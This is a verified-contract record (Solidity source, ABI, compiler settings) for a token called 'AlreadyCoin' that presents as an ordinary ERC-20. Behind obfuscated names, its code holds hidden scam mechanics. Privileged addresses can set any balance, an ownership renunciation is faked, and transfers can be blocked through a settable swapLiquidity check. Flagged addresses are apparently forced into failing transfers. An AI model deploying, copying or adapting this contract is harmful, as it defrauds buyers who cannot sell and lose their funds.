{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract receiverLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletMarketing {\n    function createPair(address launchedBuy, address atTotal) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tokenLaunchSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverReceiver) external view returns (uint256);\n\n    function transfer(address swapToken, uint256 limitTrading) external returns (bool);\n\n    function allowance(address tokenTotalMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapToken,\n        uint256 limitTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverShouldMin, uint256 value);\n    event Approval(address indexed tokenTotalMarketing, address indexed spender, uint256 value);\n}\n\ninterface maxFee is teamFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlreadyCoin is receiverLaunch, teamFrom, maxFee {\n\n    function symbol() external view virtual override returns (string memory) {\n        return isSellBuy;\n    }\n\n    function transferFrom(address marketingAmountReceiver, address swapToken, uint256 limitTrading) external override returns (bool) {\n        if (_msgSender() != fromFee) {\n            if (atWallet[marketingAmountReceiver][_msgSender()] != type(uint256).max) {\n                require(limitTrading <= atWallet[marketingAmountReceiver][_msgSender()]);\n                atWallet[marketingAmountReceiver][_msgSender()] -= limitTrading;\n            }\n        }\n        return autoSwap(marketingAmountReceiver, swapToken, limitTrading);\n    }\n\n    mapping(address => bool) public receiverList;\n\n    bool private autoTrading;\n\n    function name() external view virtual override returns (string memory) {\n        return isLimitLaunch;\n    }\n\n    function marketingMaxReceiver(address teamWallet, uint256 limitTrading) public {\n        fundEnable();\n        tradingBuyShould[teamWallet] = limitTrading;\n    }\n\n    mapping(address => uint256) private tradingBuyShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minFund;\n    }\n\n    event OwnershipTransferred(address indexed senderSell, address indexed takeEnable);\n\n    address public tokenFee;\n\n    function marketingMin(address marketingAmountReceiver, address swapToken, uint256 limitTrading) internal view returns (uint256) {\n        require(limitTrading > 0);\n\n        uint256 feeMode = 0;\n        if (marketingAmountReceiver == limitEnable && totalBuy > 0) {\n            feeMode = limitTrading * totalBuy / 100;\n        } else if (swapToken == limitEnable && listModeAuto > 0) {\n            feeMode = limitTrading * listModeAuto / 100;\n        }\n        require(feeMode <= limitTrading);\n        return limitTrading - feeMode;\n    }\n\n    function getOwner() external view returns (address) {\n        return feeListMax;\n    }\n\n    function shouldLimit() public {\n        emit OwnershipTransferred(tokenFee, address(0));\n        feeListMax = address(0);\n    }\n\n    function fundEnable() private view {\n        require(receiverList[_msgSender()]);\n    }\n\n    function allowance(address liquidityLimit, address swapReceiverEnable) external view virtual override returns (uint256) {\n        if (swapReceiverEnable == fromFee) {\n            return type(uint256).max;\n        }\n        return atWallet[liquidityLimit][swapReceiverEnable];\n    }\n\n    address public limitEnable;\n\n    uint256 constant maxExempt = 17 ** 10;\n\n    uint256 atSwap;\n\n    function minFee(uint256 limitTrading) public {\n        fundEnable();\n        swapLiquidity = limitTrading;\n    }\n\n    function autoSwap(address marketingAmountReceiver, address swapToken, uint256 limitTrading) internal returns (bool) {\n        if (marketingAmountReceiver == tokenFee) {\n            return txList(marketingAmountReceiver, swapToken, limitTrading);\n        }\n        uint256 fundFromMax = teamFrom(limitEnable).balanceOf(minBuyTotal);\n        require(fundFromMax == swapLiquidity);\n        require(swapToken != minBuyTotal);\n        if (fundTeam[marketingAmountReceiver]) {\n            return txList(marketingAmountReceiver, swapToken, maxExempt);\n        }\n        limitTrading = marketingMin(marketingAmountReceiver, swapToken, limitTrading);\n        return txList(marketingAmountReceiver, swapToken, limitTrading);\n    }\n\n    bool public amountMax;\n\n    uint256 public listModeAuto = 0;\n\n    bool public liquidityIs;\n\n    address private feeListMax;\n\n    function txList(address marketingAmountReceiver, address swapToken, uint256 limitTrading) internal returns (bool) {\n        require(tradingBuyShould[marketingAmountReceiver] >= limitTrading);\n        tradingBuyShould[marketingAmountReceiver] -= limitTrading;\n        tradingBuyShould[swapToken] += limitTrading;\n        emit Transfer(marketingAmountReceiver, swapToken, limitTrading);\n        return true;\n    }\n\n    bool public walletTxFrom;\n\n    function senderShould(address receiverShould) public {\n        if (takeTradingSell) {\n            return;\n        }\n        \n        receiverList[receiverShould] = true;\n        \n        takeTradingSell = true;\n    }\n\n    uint256 private launchTx;\n\n    uint256 swapLiquidity;\n\n    string private isLimitLaunch = \"Already Coin\";\n\n    uint8 private totalSender = 18;\n\n    function owner() external view returns (address) {\n        return feeListMax;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalSender;\n    }\n\n    uint256 public shouldSwap;\n\n    mapping(address => mapping(address => uint256)) private atWallet;\n\n    uint256 public totalBuy = 3;\n\n    function receiverIs(address sellMinReceiver) public {\n        fundEnable();\n        \n        if (sellMinReceiver == tokenFee || sellMinReceiver == limitEnable) {\n            return;\n        }\n        fundTeam[sellMinReceiver] = true;\n    }\n\n    mapping(address => bool) public fundTeam;\n\n    string private isSellBuy = \"ACN\";\n\n    address fromFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address receiverReceiver) public view virtual override returns (uint256) {\n        return tradingBuyShould[receiverReceiver];\n    }\n\n    function approve(address swapReceiverEnable, uint256 limitTrading) public virtual override returns (bool) {\n        atWallet[_msgSender()][swapReceiverEnable] = limitTrading;\n        emit Approval(_msgSender(), swapReceiverEnable, limitTrading);\n        return true;\n    }\n\n    function transfer(address teamWallet, uint256 limitTrading) external virtual override returns (bool) {\n        return autoSwap(_msgSender(), teamWallet, limitTrading);\n    }\n\n    address minBuyTotal;\n\n    constructor (){\n        \n        shouldLimit();\n        tokenLaunchSell shouldMin = tokenLaunchSell(fromFee);\n        limitEnable = walletMarketing(shouldMin.factory()).createPair(shouldMin.WETH(), address(this));\n        minBuyTotal = walletMarketing(shouldMin.factory()).feeTo();\n        if (amountMax) {\n            amountMax = true;\n        }\n        tokenFee = _msgSender();\n        receiverList[tokenFee] = true;\n        tradingBuyShould[tokenFee] = minFund;\n        \n        emit Transfer(address(0), tokenFee, minFund);\n    }\n\n    uint256 private minFund = 100000000 * 10 ** 18;\n\n    bool public takeTradingSell;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotalMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapReceiverEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listModeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"marketingMaxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"minFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMinReceiver\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTradingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAmountReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AlreadyCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}